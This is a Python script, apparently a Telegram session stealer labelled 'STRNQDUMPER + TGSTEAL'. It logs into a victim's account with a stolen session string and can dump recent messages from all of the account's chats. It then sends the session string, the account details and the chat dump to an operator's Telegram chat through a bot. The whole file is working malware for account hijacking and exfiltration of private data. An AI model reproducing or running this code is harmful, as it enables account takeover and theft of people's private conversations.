import asyncio
from datetime import datetime
import random
import sys
from telethon import TelegramClient, sync, sessions
import os
import dotenv
import json

from aiogram import Bot, Dispatcher, Router, types
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import Message
from aiogram.utils.markdown import hbold

stickers = ["♦️", "🎁", "🎟️", "🍒", "🍺", "🐱", "💮"]

sess = sys.argv[1]
session = ""

user = {}

with open(sess,encoding='utf-8') as f:
    db = json.load(f)
    session = db["session"]
    user = db["user"]

dotenv.load_dotenv()

bot_token = os.getenv("TG_TOKEN")
api_id = int(os.getenv("APIID"))
api_hash = os.getenv("APIHASH")

tg_bot = True if os.getenv("TG_BOT_ENABLED") == "1" else False
ds_bot = True if os.getenv("DS_BOT_ENABLED") == "1" else False

dump_chats = True if os.getenv("DUMP_CHATS") == "1" else False

print("Dump chats:", dump_chats)

client =  TelegramClient(sessions.StringSession(session), api_id, api_hash)
# dp = Dispatcher()

client.start()

chats = client.get_dialogs()

if dump_chats:
    with open(f"./dumps/{user['username']}.chats", "w") as f:
        f.write("GENERATED BY STRNQDUMPER + TGSTEAL\n")
    for chat in chats:
        cTitle = chat.title
        cId = chat.id
        msgs = client.get_messages(cId, int(os.getenv("DUMP_LEN")))
        with open(f"./dumps/{user['username']}.chats", "+a") as d:
            d.write(f"\n-----{cTitle}-----\n")
            for message in reversed(msgs):
                date_time = message.date
                formatted_date = date_time.strftime('[%d.%m.%y %H:%M]')
                try: d.write(f"{formatted_date}**{message.sender.username}** >> {message.message}\n")
                except: d.write(f"[{formatted_date}]**ERROR** >> {message.message}")
                
    

client.disconnect()

# @dp.message(CommandStart())
# async def command_start_handler(message: Message) -> None:
#     await message.answer(f"Hello, {hbold(message.from_user.full_name)}! ChatID: {message.chat.id}")

# async def main() -> None:
#     # Initialize Bot instance with a default parse mode which will be passed to all API calls
#     bot = Bot(bot_token, parse_mode=ParseMode.HTML)
#     # And the run events dispatching
#     await dp.start_polling(bot)

# asyncio.run(main())

if tg_bot:
    bot = Bot(bot_token, parse_mode=ParseMode.HTML)

dumps = ""

for key, value in user.items():
    dumps+=f"{random.choice(stickers)} {key}: {value}\n"

async def send_tg_dump():
    await bot.send_message(int(os.getenv("TG_CHATID")), f"✨ {hbold('New session!!!')}\n@{user['username']}\n🔑 Session string: {session}\n{dumps}")
    if dump_chats:
        await bot.send_document(int(os.getenv("TG_CHATID")), types.FSInputFile(path=f"./dumps/{user['username']}.chats"))

if tg_bot:
    asyncio.run(send_tg_dump())

# print(session, user)